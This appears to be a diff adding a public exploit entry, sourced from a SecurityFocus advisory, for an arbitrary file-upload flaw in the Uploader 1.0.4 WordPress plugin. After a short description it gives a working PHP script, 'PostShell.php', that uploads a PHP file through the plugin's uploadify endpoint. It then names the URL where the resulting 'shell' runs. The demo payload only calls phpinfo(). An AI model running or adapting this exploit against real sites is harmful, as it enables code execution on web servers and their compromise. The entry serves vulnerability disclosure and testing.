@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/57112/info
+
+The Uploader plugin for WordPress is prone to an arbitrary file-upload vulnerability because it fails to adequately validate files before uploading them.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.
+
+Uploader 1.0.4 is vulnerable; other versions may also be affected. 
+
+PostShell.php
+<?php
+
+$uploadfile="lo.php";
+$ch = curl_init("http://www.example.com/wordpress/wp-content/plugins/uploader/uploadify/uploadify.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('Filedata'=>"@$uploadfile",
+'folder'=>"/wordpress/wp-content/uploads",
+'fileext'=>'php'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.example.com/wordpress/wp-content/uploads/lo.php
+
+lo.php
+<?php
+phpinfo();
+?>
